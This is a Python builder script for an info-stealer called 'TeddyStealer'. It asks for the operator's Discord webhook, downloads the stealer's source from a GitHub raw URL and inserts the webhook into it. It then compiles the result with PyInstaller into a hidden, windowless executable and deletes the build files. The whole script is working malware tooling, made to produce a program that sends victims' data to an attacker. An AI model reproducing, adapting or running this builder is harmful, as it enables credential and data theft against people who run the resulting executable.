import os, PyInstaller.__main__, shutil, requests, fade, time

P = '\033[35m' # purple
R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
RE = '\033[0m' # reset
Y = '\033[33m' # yellow
B = '\033[34m' # blue
LG = '\033[37m' # lightgrey
BP = '\033[1;35m' # bold purple
BR = '\033[1;31m' # bold red
BG = '\033[1;32m' # bold green
BC = '\033[1;36m' # bold cyan
BRE = '\033[1;0m' # bold reset
BY = '\033[1;33m' # bold yellow
BB = '\033[1;34m' # bold blue
BLG = '\033[1;37m' # bold lightgrey
BGP = '\033[7;35m' # background purple
BGRE = '\033[7;0m' # background reset
BGR = '\033[7;31m' # background red
BGG = '\033[7;32m' # background green 
BGC = '\033[7;36m' # background cyan 
BGY = '\033[7;33m' # background yellow 
BGB = '\033[7;34m' # background blue  
BGLG = '\033[7;37m' # background light grey
ULP = '\033[4;35m' # underline purple
ULR = '\033[4;31m' # underline red
ULG = '\033[4;32m' # underline green
ULC = '\033[4;36m' # underline cyan
ULRE = '\033[4;0m' # underline reset
ULY = '\033[4;33m' # underline yellow
ULB = '\033[4;34m' # underline blue
ULLG = '\033[4;37m' # underline lightgrey



def endHandler():
  os._exit(0)


        
buh = '''
           .-""-.                    _
          /  _   \              _   /|)
        .'---""-.|             /|) /|/
      .'          `.          /|/ /|/
   __/_             \    .   /|/ /|/
 .'    `-.          .8-. \\-/|/ /|/
J   .--.  Y     .o./ .o8\ |/\ `/_.-.
|  (    \       98P  888| /\ / ( ` |
|  `-._/          |   `"|/\ / \|\  F
 `.     .            "-'|\ / \/\  J
   |---'              _/\ / \// ` |
   J                 /// /   /   F
   _\    .'`-._    ./// /   /\\.'
  /  `. / .-'  `<-'/// /  _/\ \\
  F.--.\||       `.`/ /.-' )|\ \`.
  \__.-/)'         `.-'   ')/\\  /
 .-' .'/  \               ')  `-'
(  .'.'   '`.            .'
 \'.'    '   `.       .-'
  /     '      `.__.-'/|
 J     :          `._/ |
 |     :               |
 J     ;-"""-.         F
  \   /       \       /
   `.J         L   _.'
     F         |--' |
     J         |    |__
      L        |       `.
      |        |-.      \|
      |           \   )_.'
      |        -.\ )-'
      \         )_)
       `"""""""'
Made By Shade#3421
'''
faded_text = fade.random(buh)
print(faded_text)

webhookk = input(f"{P}Input Webhook:{RE} ")

if not "api/webhooks" in webhookk:
        print(f"\n{R}Invalid Webhook.{RE}")
        time.sleep(3)
        endHandler()

fileName = input(f"{P}Input File Name:{RE} ")

code = requests.get("https://raw.githubusercontent.com/Shade3421/TeddyStealer/main/TeddyStealer.py").text.replace("WEBHOOK", webhookk)
with open(f"{fileName}.py", 'w') as f:
    f.write(code)

print(f"\nCreating {fileName}.exe\n")
os.system(f'title Creating {fileName}.exe')
    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
PyInstaller.__main__.run([
        '%s.py' % fileName,
        '--name=%s' % fileName,
        '--onefile',
        '--noconsole',
        '--log-level=INFO',
        '--icon=NONE',
    ])
try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
except FileNotFoundError:
        pass

print(f"\nFile created as {fileName}.exe\n")
input(f'Enter anything to continue . . .  ')
endHandler()